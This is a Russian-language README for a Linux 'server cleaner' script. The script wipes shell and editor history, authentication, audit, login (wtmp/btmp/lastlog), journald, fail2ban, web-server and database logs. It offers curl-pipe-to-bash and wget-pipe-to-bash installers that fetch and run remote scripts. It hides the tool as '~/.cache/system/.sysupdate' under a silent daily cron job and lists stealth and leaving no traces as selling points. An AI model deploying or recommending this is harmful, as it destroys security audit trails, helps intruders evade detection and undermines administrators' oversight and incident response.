# Server Cleaner

🧹 Мощный скрипт для комплексной очистки логов, истории и следов активности на Linux серверах.

## ⚠️ Предупреждение

Этот скрипт удаляет:
- Историю команд (bash, zsh, fish)
- Системные логи (auth, syslog, kern, dpkg, apt)
- Логи входов на сервер (wtmp, btmp, lastlog)
- Журналы systemd (journald)
- Логи веб-серверов (nginx, apache)
- Логи баз данных (MySQL, PostgreSQL, Redis)
- Логи Docker контейнеров (только логи, образы не трогаются)
- Логи fail2ban и audit
- Следы работы в редакторах (vim, nano, less)
- Coredumps
- Кеш пакетных менеджеров
- Временные файлы

**Используйте только на своих серверах и под свою ответственность!**

## 🚀 Автоматическая установка (рекомендуется)

Скрипт установится в скрытую директорию и добавится в crontab:

```bash
curl -fsSL https://raw.githubusercontent.com/HVHBIGNAME/server-cleaner/main/install.sh | bash
```

или с wget:

```bash
wget -qO- https://raw.githubusercontent.com/HVHBIGNAME/server-cleaner/main/install.sh | bash
```

### Что делает install.sh:
1. Создаёт скрытую директорию `~/.cache/system`
2. Скачивает туда скрипт как `.sysupdate`
3. Добавляет задачу в crontab (ежедневно в 00:00)
4. Предлагает запустить сразу

## 🗑️ Удаление

### Автоматическое удаление:

```bash
curl -fsSL https://raw.githubusercontent.com/HVHBIGNAME/server-cleaner/main/uninstall.sh | bash
```

### Ручное удаление:

```bash
# Удалить из crontab
crontab -l | grep -v '.sysupdate' | crontab -

# Удалить скрипт
rm -f ~/.cache/system/.sysupdate
```

## 📋 Ручная установка

### Разовый запуск (без сохранения):

```bash
curl -fsSL https://raw.githubusercontent.com/HVHBIGNAME/server-cleaner/main/clean.sh | sudo bash
```

### Установка вручную:

```bash
# Создать скрытую директорию
mkdir -p ~/.cache/system

# Скачать скрипт
wget -O ~/.cache/system/.sysupdate https://raw.githubusercontent.com/HVHBIGNAME/server-cleaner/main/clean.sh

# Дать права на выполнение
chmod +x ~/.cache/system/.sysupdate

# Добавить в crontab (каждый день в 00:00)
(crontab -l 2>/dev/null; echo "0 0 * * * /bin/bash ~/.cache/system/.sysupdate >/dev/null 2>&1") | crontab -
```

## 🛠️ Управление

### Проверить установленные задачи cron:

```bash
crontab -l
```

### Запустить вручную:

```bash
bash ~/.cache/system/.sysupdate
```

или под root:

```bash
sudo bash ~/.cache/system/.sysupdate
```

### Обновить до последней версии:

```bash
curl -fsSL https://raw.githubusercontent.com/HVHBIGNAME/server-cleaner/main/clean.sh -o ~/.cache/system/.sysupdate
chmod +x ~/.cache/system/.sysupdate
```

## 📝 Что очищает скрипт

### 🔤 История команд
- `~/.bash_history` — bash
- `~/.zsh_history` — zsh
- `~/.local/share/fish/fish_history` — fish
- `/root/.bash_history` и `/root/.zsh_history` — root

### 📝 Следы редакторов
- `~/.viminfo` — история vim
- `~/.lesshst` — история less
- `~/.nano_history` — история nano

### 🗂️ Системные логи
- `/var/log/auth.log` — логи аутентификации
- `/var/log/syslog` — основной системный лог
- `/var/log/kern.log` — логи ядра
- `/var/log/dpkg.log` — логи установки пакетов
- `/var/log/apt/*` — логи apt
- `/var/log/secure` — альтернативный лог аутентификации (CentOS/RHEL)
- `/var/log/messages` — общие системные сообщения
- `/var/log/audit/audit.log` — логи auditd

### 👤 Логи входов
- `/var/log/wtmp` — история входов (команда `last`)
- `/var/log/btmp` — неудачные попытки входа (команда `lastb`)
- `/var/log/lastlog` — последний вход каждого пользователя (команда `lastlog`)

### 🌐 Логи веб-серверов
- `/var/log/nginx/*` — логи nginx
- `/var/log/apache2/*` — логи apache

### 🗄️ Логи баз данных
- `/var/log/mysql/*` — логи MySQL
- `/var/log/postgresql/*` — логи PostgreSQL
- `/var/log/redis/*` — логи Redis

### 🐳 Docker
- `/var/lib/docker/containers/*/*-json.log` — логи контейнеров
- **Образы и volumes НЕ удаляются!**

### 🛡️ Логи безопасности
- `/var/log/fail2ban.log` — логи fail2ban

### 🔧 Системные компоненты
- **Journald** — ротация и очистка журналов systemd
- **Coredumps** — удаление `/var/lib/systemd/coredump/*`
- **Кеш пакетов** — apt-get clean, yum clean, dnf clean
- **Временные файлы** — `/tmp`, `/var/tmp`, кеш apt

## 🔒 Безопасность

Скрипт:
- ✅ Работает тихо (без вывода в консоль)
- ✅ Установлен в скрытую директорию `.cache/system`
- ✅ Имеет незаметное имя `.sysupdate`
- ✅ Запускается автоматически без следов в истории
- ✅ Использует `>/dev/null 2>&1` в crontab
- ✅ Совместим с `sh` и `bash`

## 💡 Особенности

- **Универсальность**: Работает на Debian, Ubuntu, CentOS, RHEL, Fedora
- **Безопасность**: Все ошибки подавлены (`2>/dev/null`)
- **Совместимость**: Проверяет наличие команд перед использованием
- **Комплексность**: Очищает следы из всех популярных сервисов
- **Автоматизация**: Однократная установка, работает постоянно
- **Мягкая очистка Docker**: Удаляет только логи, образы остаются

## 📦 Файлы

- `clean.sh` — основной скрипт очистки
- `install.sh` — скрипт автоматической установки
- `uninstall.sh` — скрипт удаления

## 🔄 Обновление

Чтобы обновить установленный скрипт до последней версии:

```bash
curl -fsSL https://raw.githubusercontent.com/HVHBIGNAME/server-cleaner/main/clean.sh -o ~/.cache/system/.sysupdate
chmod +x ~/.cache/system/.sysupdate
```

## 📄 Лицензия

MIT
